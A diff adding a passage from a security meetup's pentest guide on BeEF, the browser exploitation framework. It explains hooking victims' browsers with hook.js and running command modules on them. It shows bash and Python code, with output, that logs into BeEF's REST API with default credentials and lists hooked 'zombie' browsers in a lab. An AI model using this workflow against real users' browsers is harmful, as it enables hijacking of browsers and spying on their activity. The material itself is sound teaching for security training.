@@ -1,0 +1,1065 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>6.2. BeEF &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="6. Pentest Network Tools" href="../pentest_network_tools.html"/>
+        <link rel="next" title="6.3. Burp Suite and ZAP" href="burp_suite.html"/>
+        <link rel="prev" title="6.1. aircrack-ng" href="aircrack-ng.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="aircrack-ng.html">6.1. aircrack-ng</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">6.2. BeEF</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#what-beef-does">6.2.1. What BeEF does</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#beef-architecture">6.2.1.1. BeEF architecture</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#getting-hooked-becoming-a-bot">6.2.1.2. Getting hooked (becoming a bot)</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#exploiting-hooked-browsers">6.2.1.3. Exploiting hooked browsers</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#setting-up-beef-in-kali">6.2.2. Setting up BeEF in Kali</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#installation">6.2.2.1. Installation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#beef-configuration">6.2.2.2. BeEF configuration</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#running-beef">6.2.3. Running BeEF</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#starting-the-services">6.2.3.1. Starting the services</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#hook-browsers">6.2.3.2. Hook browsers</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id5">6.2.3.3. Exploiting hooked browsers</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#more-exploiting-hooked-browsers">6.2.3.4. More exploiting hooked browsers</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#stopping-the-services">6.2.3.5. Stopping the services</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#digitalocean-beef-clone-page-example">6.2.4. DigitalOcean BeEF clone_page example</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#server-setup">6.2.4.1. Server setup</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#clone-page">6.2.4.2. Clone_page</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#google-compute-engine-beef-clone-page-example">6.2.5. Google Compute Engine BeEF clone_page example</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#external-vs-internal-ip">6.2.5.1. External vs internal IP</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id7">6.2.5.2. Server setup</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id8">6.2.5.3. Clone_page</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#server-delete">6.2.5.4. Server delete</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="burp_suite.html">6.3. Burp Suite and ZAP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="curl.html">6.4. curl</a></li>
+<li class="toctree-l2"><a class="reference internal" href="drive_droid_kon-boot.html">6.5. DriveDroid &amp; Kon-Boot</a></li>
+<li class="toctree-l2"><a class="reference internal" href="mana.html">6.6. mana</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nmap.html">6.7. nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="openvas.html">6.8. OpenVAS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="pcredz.html">6.9. Pcredz pcap credentials</a></li>
+<li class="toctree-l2"><a class="reference internal" href="hak5_pineapple.html">6.10. Hak5 Pineapple</a></li>
+<li class="toctree-l2"><a class="reference internal" href="proxychains.html">6.11. Proxy Chains</a></li>
+<li class="toctree-l2"><a class="reference internal" href="responder.html">6.12. Responder</a></li>
+<li class="toctree-l2"><a class="reference internal" href="socat.html">6.13. <code class="docutils literal"><span class="pre">socat</span></code> vs (<code class="docutils literal"><span class="pre">nc</span></code> vs <code class="docutils literal"><span class="pre">ncat</span></code> vs <code class="docutils literal"><span class="pre">netcat</span></code>)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="sqlmap.html">6.14. sqlmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="tcpdump_tcpflow.html">6.15. tcpdump &amp; tcpflow</a></li>
+<li class="toctree-l2"><a class="reference internal" href="tunneling_traffic.html">6.16. Tunneling Traffic</a></li>
+<li class="toctree-l2"><a class="reference internal" href="webgoat.html">6.17. Web Goat</a></li>
+<li class="toctree-l2"><a class="reference internal" href="wireshark.html">6.18. Wireshark</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xsscrapy.html">6.19. xsscrapy</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_network_tools.html">6. Pentest Network Tools</a> &raquo;</li>
+        
+      <li>6.2. BeEF</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/network_tools/beef.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="id1">
+<h1>6.2. <a class="reference external" href="http://beefproject.com/">BeEF</a><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h1>
+<p><a class="reference external" href="http://beefproject.com/">BeEF</a> is a ruby-based application that “will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.” This source code is available on GitHub at <a class="reference external" href="https://github.com/beefproject/beef">beefproject/beef</a>. For detailed information see the <a class="reference external" href="https://github.com/beefproject/beef/wiki">BeEF wiki</a> and the lead core developer’s presentation <a class="reference external" href="http://2012.zeronights.org/includes/docs/Antisnatchor%20-%20All%20you%20ever%20wanted%20to%20know%20about%20BEEF.pdf">All you ever wanted to know about BeEF</a>.</p>
+<div class="section" id="what-beef-does">
+<h2>6.2.1. What BeEF does<a class="headerlink" href="#what-beef-does" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="beef-architecture">
+<h3>6.2.1.1. BeEF architecture<a class="headerlink" href="#beef-architecture" title="Permalink to this headline">¶</a></h3>
+<p>To understand BeEF, read <a class="reference external" href="https://github.com/beefproject/beef/wiki/Architecture">BeEF architecture</a>. The communication server runs by default on TCP port 3000:</p>
+<dl class="docutils">
+<dt><a class="reference external" href="http://localhost:3000/ui/panel">http://localhost:3000/ui/panel</a></dt>
+<dd>BeEF admin web page</dd>
+<dt><a class="reference external" href="http://localhost:3000/demos/basic.html">http://localhost:3000/demos/basic.html</a></dt>
+<dd>Basic demo page to hook victims</dd>
+<dt><a class="reference external" href="http://localhost:3000/demos/butcher/index.html">http://localhost:3000/demos/butcher/index.html</a></dt>
+<dd>Another demo page to hook victims</dd>
+</dl>
+</div>
+<div class="section" id="getting-hooked-becoming-a-bot">
+<h3>6.2.1.2. Getting hooked (becoming a bot)<a class="headerlink" href="#getting-hooked-becoming-a-bot" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="get-client-to-run-hook-js">
+<h4>6.2.1.2.1. Get client to run <strong class="program">hook.js</strong><a class="headerlink" href="#get-client-to-run-hook-js" title="Permalink to this headline">¶</a></h4>
+<p>The attacker starts the BeEF communication server and then sets out to entice web browsers to get hooked by running <strong class="program">hook.js</strong> from some web page. A hooked web browser defaults to polling the BeEF communication server every 5 seconds for commands.</p>
+</div>
+<div class="section" id="server-creates-hook-js-dynamically">
+<h4>6.2.1.2.2. Server creates <strong class="program">hook.js</strong> dynamically<a class="headerlink" href="#server-creates-hook-js-dynamically" title="Permalink to this headline">¶</a></h4>
+<p>If you look for <strong class="program">hook.js</strong> in the souce code you won’t find it; it’s dynamically built for each new client based on BeEF configuration options. <a class="reference external" href="https://github.com/beefproject/beef/blob/master/core/main/handlers/hookedbrowsers.rb">beef/core/main/handlers/hookedbrowsers.rb</a> “handles connections from hooked browsers to the framework” and calls <code class="docutils literal"><span class="pre">build_beefjs!(host_name)</span></code> for unhooked browsers. <a class="reference external" href="https://github.com/beefproject/beef/blob/master/core/main/handlers/modules/beefjs.rb">beef/core/main/handlers/modules/beefjs.rb</a> contains an <code class="docutils literal"><span class="pre">build_beefjs!(req_host)</span></code> which defines <code class="docutils literal"><span class="pre">hook.js</span></code> as an obfuscated combination of: core/main/client/ modules beef.js browser.js browser/cookie.js browser/popup.js session.js os.js hardware.js dom.js logger.js net.js updater.js encode/base64.js encode/json.js net/local.js init.js mitb.js net/dns.js net/cors.js are.js websocket.js lib/webrtcadapter.js webrtc.js timeout.js.</p>
+</div>
+</div>
+<div class="section" id="exploiting-hooked-browsers">
+<h3>6.2.1.3. Exploiting hooked browsers<a class="headerlink" href="#exploiting-hooked-browsers" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="beef-modules">
+<h4>6.2.1.3.1. BeEF modules<a class="headerlink" href="#beef-modules" title="Permalink to this headline">¶</a></h4>
+<p>BeEF has both modules and extensions. From <a class="reference external" href="https://github.com/beefproject/beef/wiki/Creating-An-Extension">Creating An Extension</a>:</p>
+<blockquote>
+<div><p>As the name implies, extensions serve to “extend” the capabilities of BeEF. Extensions differ slightly from modules. They are a way to add new functionality to the core features of BeEF whereas modules usually have a narrow set of abilities that perform a specific task. This helps prevent feature creep by modularizing new core features. So if you’re asking yourself…</p>
+<p><strong>“I have a new idea, should it be a module or an extension?”</strong></p>
+<p>Does it change the way BeEF behaves? <strong>Extension</strong></p>
+<p>Does it change the way zombies behave? <strong>Module</strong></p>
+</div></blockquote>
+<p>A module usually consists of a <code class="file docutils literal"><span class="pre">config.yaml</span></code> configuration file, a ruby script <strong class="program">module.rb</strong> to execute on the communication server, and the JavaScript payload <strong class="program">command.js</strong> to execute on the client. Basically, anything you can do from JavaScript in the browser you can do through BeEF. The hooked browser will pull the command from the communication server and return the results. For detailed information about modules see <a class="reference external" href="https://github.com/beefproject/beef/wiki/Module-creation">BeEF wiki Module creation</a> and the actual <a class="reference external" href="https://github.com/beefproject/beef/tree/master/modules">beef/modules/</a> in the <a class="reference external" href="https://github.com/beefproject/beef">BeEF repository</a>.</p>
+</div>
+<div class="section" id="beef-admin-gui-restful-api">
+<span id="beef-restful-api"></span><h4>6.2.1.3.2. BeEF admin GUI &amp; RESTful API<a class="headerlink" href="#beef-admin-gui-restful-api" title="Permalink to this headline">¶</a></h4>
+<p>The attacker directs BeEF module commands to be exectued on a hooked client, either via BeEF’s Admin GUI (<a class="reference external" href="http://localhost:3000/ui/panel">http://localhost:3000/ui/panel</a>) or the <a class="reference external" href="https://github.com/beefproject/beef/wiki/BeEF-RESTful-API">BeEF RESTful API</a>. The API requires a token which is regenerated by the BeEF server every restart. You can either manually look at the log file, or get it via the following:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">BEEF_IPP</span><span class="o">=</span><span class="s2">&quot;localhost:3000&quot;</span>
+<span class="nv">BEEF_USER</span><span class="o">=</span>beef
+<span class="nv">BEEF_PW</span><span class="o">=</span>beef
+<span class="hll"><span class="nv">DATA</span><span class="o">=</span><span class="s1">&#39;{&quot;username&quot;:&quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_USER</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;, &quot;password&quot;:&quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_PW</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;}&#39;</span>
+</span><span class="hll"><span class="nv">RESPONSE</span><span class="o">=</span><span class="k">$(</span>curl --silent --request POST <span class="se">\</span>
+</span><span class="hll">               --header <span class="s2">&quot;Content-Type: application/json&quot;</span> <span class="se">\</span>
+</span><span class="hll">               --data <span class="s2">&quot;</span><span class="nv">$DATA</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">            http://<span class="nv">$BEEF_IPP</span>/api/admin/login<span class="k">)</span>
+</span><span class="nv">SUCCESS</span><span class="o">=</span><span class="si">${</span><span class="nv">RESPONSE</span><span class="p">#*</span><span class="se">\&quot;</span><span class="nv">success</span><span class="se">\&quot;</span><span class="p">:</span><span class="si">}</span>
+<span class="nv">SUCCESS</span><span class="o">=</span><span class="si">${</span><span class="nv">SUCCESS</span><span class="p">%%,*</span><span class="si">}</span>
+<span class="hll"><span class="nb">echo</span> <span class="nv">SUCCESS</span><span class="o">=</span><span class="nv">$SUCCESS</span>
+</span><span class="nv">TOKEN</span><span class="o">=</span><span class="si">${</span><span class="nv">RESPONSE</span><span class="p">#*</span><span class="se">\&quot;</span><span class="nv">token</span><span class="se">\&quot;</span><span class="p">:</span><span class="se">\&quot;</span><span class="si">}</span>
+<span class="nv">TOKEN</span><span class="o">=</span><span class="si">${</span><span class="nv">TOKEN</span><span class="p">%%</span><span class="se">\&quot;</span><span class="p">*</span><span class="si">}</span>
+<span class="hll"><span class="nb">echo</span> <span class="nv">TOKEN</span><span class="o">=</span><span class="nv">$TOKEN</span>
+</span></pre></div>
+</div>
+<p>Running this will return a JSON response which can be parsed for the token:</p>
+<div class="highlight-none"><div class="highlight"><pre><span></span>hacker@kali:~$ BEEF_IPP=&quot;localhost:3000&quot;
+hacker@kali:~$ BEEF_USER=beef
+hacker@kali:~$ BEEF_PW=beef
+hacker@kali:~$ DATA=&#39;{&quot;username&quot;:&quot;&#39;&quot;$BEEF_USER&quot;&#39;&quot;, &quot;password&quot;:&quot;&#39;&quot;$BEEF_PW&quot;&#39;&quot;}&#39;
+hacker@kali:~$ RESPONSE=$(curl --silent --request POST \
+&gt;                --header &quot;Content-Type: application/json&quot; \
+&gt;                --data &quot;$DATA&quot; \
+&gt;             http://$BEEF_IPP/api/admin/login)
+hacker@kali:~$ SUCCESS=${RESPONSE#*\&quot;success\&quot;:}
+hacker@kali:~$ SUCCESS=${SUCCESS%%,*}
+hacker@kali:~$ echo SUCCESS=$SUCCESS
+<span class="hll">SUCCESS=true
+</span>hacker@kali:~$ TOKEN=${RESPONSE#*\&quot;token\&quot;:\&quot;}
+hacker@kali:~$ TOKEN=${TOKEN%%\&quot;*}
+hacker@kali:~$ echo TOKEN=$TOKEN
+<span class="hll">TOKEN=dc3f8c382f282c4aa0d55bf2e6218ffa83342ff7
+</span>hacker@kali:~$ echo $RESPONSE
+<span class="hll">{&quot;success&quot;:true,&quot;token&quot;:&quot;dc3f8c382f282c4aa0d55bf2e6218ffa83342ff7&quot;}
+</span></pre></div>
+</div>
+<p>Use the $TOKEN for RESTFull API calls:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">BEEF_IPP</span><span class="o">=</span><span class="s2">&quot;localhost:3000&quot;</span>
+<span class="hll"><span class="nv">TOKEN</span><span class="o">=</span>dc3f8c382f282c4aa0d55bf2e6218ffa83342ff7
+</span><span class="c1"># list hooked-browsers</span>
+<span class="hll">curl --silent http://<span class="nv">$BEEF_IPP</span>/api/hooks?token<span class="o">=</span><span class="nv">$TOKEN</span>
+</span><span class="c1"># list logs</span>
+<span class="hll">curl --silent http://<span class="nv">$BEEF_IPP</span>/api/logs?token<span class="o">=</span><span class="nv">$TOKEN</span>
+</span></pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">BEEF_IPP</span><span class="o">=</span><span class="s2">&quot;localhost:3000&quot;</span>
+<span class="gp">hacker@kali:~$</span> <span class="nv">TOKEN</span><span class="o">=</span>dc3f8c382f282c4aa0d55bf2e6218ffa83342ff7
+<span class="gp">hacker@kali:~$ #</span> list hooked-browsers
+<span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent http://<span class="nv">$BEEF_IPP</span>/api/hooks?token<span class="o">=</span><span class="nv">$TOKEN</span>
+</span><span class="hll"><span class="go">{&quot;hooked-browsers&quot;:{&quot;online&quot;:{},&quot;offline&quot;:{&quot;0&quot;:{&quot;id&quot;:1,&quot;session&quot;:&quot;VVr7xmQSYAR2ScvA4d7xCxkFnGYc6MMxhmoqoZ9HUdHQ6X4zHLK9HPqI0hTtZ3Mx0FXSoL9cMutn915J&quot;,&quot;name&quot;:null,&quot;version&quot;:&quot;UNKNOWN&quot;,&quot;os&quot;:&quot;Linux&quot;,&quot;platform&quot;:&quot;Linux x86_64&quot;,&quot;ip&quot;:&quot;192.168.1.28&quot;,&quot;domain&quot;:&quot;192.168.1.104&quot;,&quot;port&quot;:&quot;3000&quot;,&quot;page_uri&quot;:&quot;http://192.168.1.104:3000/demos/basic.html&quot;}}}}</span>
+</span><span class="gp">hacker@kali:~$ #</span> list logs
+<span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent http://<span class="nv">$BEEF_IPP</span>/api/logs?token<span class="o">=</span><span class="nv">$TOKEN</span>
+</span><span class="hll"><span class="go">{&quot;logs_count&quot;:14,&quot;logs&quot;:[{&quot;id&quot;:1,&quot;date&quot;:&quot;2015-05-07T22:11:44-07:00&quot;,&quot;event&quot;:&quot;User with ip 127.0.0.1 has successfuly authenticated in the application.&quot;,&quot;type&quot;:&quot;Authentication&quot;},{&quot;id&quot;:2,&quot;date&quot;:&quot;2015-05-07T23:31:44-07:00&quot;,&quot;event&quot;:&quot;User with ip 127.0.0.1 has successfuly logged out.&quot;,&quot;type&quot;:&quot;Authentication&quot;},{&quot;id&quot;:3,&quot;date&quot;:&quot;2015-05-07T23:35:30-07:00&quot;,&quot;event&quot;:&quot;User with ip 127.0.0.1 has successfuly authenticated in the application.&quot;,&quot;type&quot;:&quot;Authentication&quot;},{&quot;id&quot;:4,&quot;date&quot;:&quot;2015-05-07T23:40:31-07:00&quot;,&quot;event&quot;:&quot;192.168.1.28 just joined the horde from the domain: 192.168.1.104:3000&quot;,&quot;type&quot;:&quot;Zombie&quot;},{&quot;id&quot;:5,&quot;date&quot;:&quot;2015-05-07T23:40:31-07:00&quot;,&quot;event&quot;:&quot;192.168.1.28 appears to have come back online&quot;,&quot;type&quot;:&quot;Zombie&quot;},{&quot;id&quot;:6,&quot;date&quot;:&quot;2015-05-07T23:40:40-07:00&quot;,&quot;event&quot;:&quot;0.009s - [Focus] Browser window has regained focus.&quot;,&quot;type&quot;:&quot;Event&quot;},{&quot;id&quot;:7,&quot;date&quot;:&quot;2015-05-07T23:40:40-07:00&quot;,&quot;event&quot;:&quot;2.412s - [Blur] Browser window has lost focus.&quot;,&quot;type&quot;:&quot;Event&quot;},{&quot;id&quot;:8,&quot;date&quot;:&quot;2015-05-07T23:40:45-07:00&quot;,&quot;event&quot;:&quot;7.428s - [Focus] Browser window has regained focus.&quot;,&quot;type&quot;:&quot;Event&quot;},{&quot;id&quot;:9,&quot;date&quot;:&quot;2015-05-07T23:40:45-07:00&quot;,&quot;event&quot;:&quot;7.505s - [Mouse Click] x: 704 y:401 &gt; html &quot;,&quot;type&quot;:&quot;Event&quot;},{&quot;id&quot;:10,&quot;date&quot;:&quot;2015-05-07T23:41:00-07:00&quot;,&quot;event&quot;:&quot;24.461s - [Blur] Browser window has lost focus.&quot;,&quot;type&quot;:&quot;Event&quot;},{&quot;id&quot;:11,&quot;date&quot;:&quot;2015-05-07T23:43:06-07:00&quot;,&quot;event&quot;:&quot;147.520s - [Focus] Browser window has regained focus.&quot;,&quot;type&quot;:&quot;Event&quot;},{&quot;id&quot;:12,&quot;date&quot;:&quot;2015-05-07T23:43:06-07:00&quot;,&quot;event&quot;:&quot;147.551s - [Blur] Browser window has lost focus.&quot;,&quot;type&quot;:&quot;Event&quot;},{&quot;id&quot;:13,&quot;date&quot;:&quot;2015-05-07T23:49:57-07:00&quot;,&quot;event&quot;:&quot;User with ip 127.0.0.1 has successfuly logged out.&quot;,&quot;type&quot;:&quot;Authentication&quot;},{&quot;id&quot;:14,&quot;date&quot;:&quot;2015-05-08T10:00:06-07:00&quot;,&quot;event&quot;:&quot;User with ip 192.168.1.28 has successfuly authenticated in the application.&quot;,&quot;type&quot;:&quot;Authentication&quot;}]}</span>
+</span></pre></div>
+</div>
+<p>Of course json and bash don’t mix well. Here go some examples using python2/3:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># python2 using requests</span>
+<span class="n">python2</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="c1"># first get the token</span>
+<span class="n">url_base</span> <span class="o">=</span> <span class="s2">&quot;http://localhost:3000&quot;</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;beef&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;beef&quot;</span><span class="p">})</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;text/json&quot;</span><span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_base</span> <span class="o">+</span> <span class="s2">&quot;/api/admin/login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+<span class="n">token</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]}</span>
+<span class="c1"># now get hooked browsers</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_base</span> <span class="o">+</span> <span class="s2">&quot;/api/hooks&quot;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">token</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">json</span>
+<span class="nb">exit</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-pycon"><div class="highlight"><pre><span></span><span class="go">hacker@kali:~$ # python2 using requests</span>
+<span class="go">hacker@kali:~$ python2</span>
+<span class="go">Python 2.7.3 (default, Mar 13 2014, 11:03:55)</span>
+<span class="go">[GCC 4.7.2] on linux2</span>
+<span class="go">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">json</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="c1"># first get the token</span>
+<span class="gp">... </span><span class="n">url_base</span> <span class="o">=</span> <span class="s2">&quot;http://localhost:3000&quot;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;beef&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;beef&quot;</span><span class="p">})</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;text/json&quot;</span><span class="p">}</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_base</span> <span class="o">+</span> <span class="s2">&quot;/api/admin/login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">token</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]}</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="c1"># now get hooked browsers</span>
+<span class="gp">... </span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_base</span> <span class="o">+</span> <span class="s2">&quot;/api/hooks&quot;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">token</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">json</span>
+<span class="hll"><span class="go">{u&#39;hooked-browsers&#39;: {u&#39;offline&#39;: {u&#39;0&#39;: {u&#39;domain&#39;: u&#39;192.168.1.104&#39;, u&#39;version&#39;: u&#39;UNKNOWN&#39;, u&#39;ip&#39;: u&#39;192.168.1.28&#39;, u&#39;port&#39;: u&#39;3000&#39;, u&#39;platform&#39;: u&#39;Linux x86_64&#39;, u&#39;session&#39;: u&#39;VVr7xmQSYAR2ScvA4d7xCxkFnGYc6MMxhmoqoZ9HUdHQ6X4zHLK9HPqI0hTtZ3Mx0FXSoL9cMutn915J&#39;, u&#39;page_uri&#39;: u&#39;http://192.168.1.104:3000/demos/basic.html&#39;, u&#39;os&#39;: u&#39;Linux&#39;, u&#39;id&#39;: 1, u&#39;name&#39;: None}}, u&#39;online&#39;: {u&#39;0&#39;: {u&#39;domain&#39;: u&#39;192.168.1.104&#39;, u&#39;version&#39;: u&#39;UNKNOWN&#39;, u&#39;ip&#39;: u&#39;192.168.1.28&#39;, u&#39;port&#39;: u&#39;3000&#39;, u&#39;platform&#39;: u&#39;Linux x86_64&#39;, u&#39;session&#39;: u&#39;1kOFWialLh8VOvwmu9DO6EDrw7aXwE0GC77furHwAEGi7u0P96uMXgdfKf5h58sCru4dzRqYjkKx6sgn&#39;, u&#39;page_uri&#39;: u&#39;http://192.168.1.104:3000/demos/basic.html&#39;, u&#39;os&#39;: u&#39;Linux&#39;, u&#39;id&#39;: 2, u&#39;name&#39;: None}}}}</span>
